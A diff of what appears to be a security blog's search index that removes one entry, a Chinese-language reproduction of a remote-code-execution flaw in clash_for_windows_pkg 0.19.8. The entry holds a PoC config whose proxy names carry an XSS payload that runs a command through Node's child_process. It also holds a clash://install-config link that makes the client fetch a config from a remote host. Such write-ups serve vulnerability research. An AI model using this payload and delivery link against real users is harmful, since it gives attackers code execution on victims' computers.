@@ -895,40 +895,6 @@
       </tags>
   </entry>
   <entry>
-    <title>clash_for_windows_pkg RCE</title>
-    <url>/article/4120caeb.html</url>
-    <content><![CDATA[<h2 id="描述"><a class="anchor" href="#描述">#</a> 描述</h2>
-<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZuZHJvaWQvY2xhc2hfZm9yX3dpbmRvd3NfcGtn">clash_for_windows_pkg</span> 由 Electron 提供。如果 XSS 负载以代理的名义存在，我们可以在受害者的计算机上远程执行任何 JavaScript 代码。</p>
-<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220225172245405.png" alt="image-20220225172245405" /></p>
-<h2 id="受影响版本的clash_for_windows_pkg"><a class="anchor" href="#受影响版本的clash_for_windows_pkg">#</a> 受影响版本的 clash_for_windows_pkg</h2>
-<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>version: <span class="token number">0.19</span>.8</pre></td></tr><tr><td data-num="2"></td><td><pre>Platform: Windows</pre></td></tr><tr><td data-num="3"></td><td><pre>OS specifics: Windows <span class="token number">10</span></pre></td></tr></table></figure><h2 id="poc"><a class="anchor" href="#poc">#</a> PoC</h2>
-<ol>
-<li>导入以下 clash 配置文件：</li>
-</ol>
-<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>port<span class="token punctuation">:</span> <span class="token number">7890</span></pre></td></tr><tr><td data-num="2"></td><td><pre>socks<span class="token operator">-</span>port<span class="token punctuation">:</span> <span class="token number">7891</span></pre></td></tr><tr><td data-num="3"></td><td><pre>allow<span class="token operator">-</span>lan<span class="token punctuation">:</span> <span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="4"></td><td><pre>mode<span class="token punctuation">:</span> Rule</pre></td></tr><tr><td data-num="5"></td><td><pre>log<span class="token operator">-</span>level<span class="token punctuation">:</span> info</pre></td></tr><tr><td data-num="6"></td><td><pre>external<span class="token operator">-</span>controller<span class="token punctuation">:</span> <span class="token punctuation">:</span><span class="token number">9090</span></pre></td></tr><tr><td data-num="7"></td><td><pre>proxies<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token operator">-</span> name<span class="token punctuation">:</span> a<span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`require("child_process").exec("calc.exe");`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></pre></td></tr><tr><td data-num="9"></td><td><pre>    type<span class="token punctuation">:</span> socks5</pre></td></tr><tr><td data-num="10"></td><td><pre>    server<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    port<span class="token punctuation">:</span> <span class="token string double-quoted-string">"17938"</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    skip<span class="token operator">-</span>cert<span class="token operator">-</span>verify<span class="token punctuation">:</span> <span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token operator">-</span> name<span class="token punctuation">:</span> abc</pre></td></tr><tr><td data-num="14"></td><td><pre>    type<span class="token punctuation">:</span> socks5</pre></td></tr><tr><td data-num="15"></td><td><pre>    server<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    port<span class="token punctuation">:</span> <span class="token string double-quoted-string">"8088"</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    skip<span class="token operator">-</span>cert<span class="token operator">-</span>verify<span class="token punctuation">:</span> <span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>proxy<span class="token operator">-</span>groups<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token operator">-</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    name<span class="token punctuation">:</span> <span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`require("child_process").exec("calc.exe");`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></pre></td></tr><tr><td data-num="22"></td><td><pre>    type<span class="token punctuation">:</span> select</pre></td></tr><tr><td data-num="23"></td><td><pre>    proxies<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token operator">-</span> a<span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token operator">/</span>onerror<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`require("child_process").exec("calc.exe");`</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span></pre></td></tr></table></figure><ol start="2">
-<li>在 “配置文件” 中切换到它</li>
-<li>单击 “代理” 列（有时不需要）</li>
-</ol>
-<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220225172446921.png" alt="image-20220225172446921" /></p>
-<p>弹出 calc</p>
-<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220225172150724.png" alt="image-20220225172150724" /></p>
-<p><strong>注意:</strong></p>
-<ul>
-<li>您需要确保有效负载显示在代理列中。</li>
-<li>该漏洞理论上是稳定的，但有时可能需要重新启动 clash_for_windows_pkg 并复制该漏洞</li>
-</ul>
-<h2 id="a-way-to-exploit"><a class="anchor" href="#a-way-to-exploit">#</a> A way to Exploit</h2>
-<p>将配置文件放到浏览器上使用  <code>clash://</code>  安装它，clash_for_windows_pkg 将自动下载并切换到它。</p>
-<p>例如：</p>
-<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>clash://install-config?url<span class="token operator">=</span>http%3A%2F%2F1.1.1.1%3A8888%2F1.txt<span class="token operator">&amp;</span><span class="token assign-left variable">name</span><span class="token operator">=</span>RCE</pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>linux下信息搜集及msf工具用法</title>
     <url>/article/fad2c18a.html</url>
     <content><![CDATA[<h3 id="00x01linux下的信息收集"><a class="anchor" href="#00x01linux下的信息收集">#</a> 00x01.Linux 下的信息收集</h3>
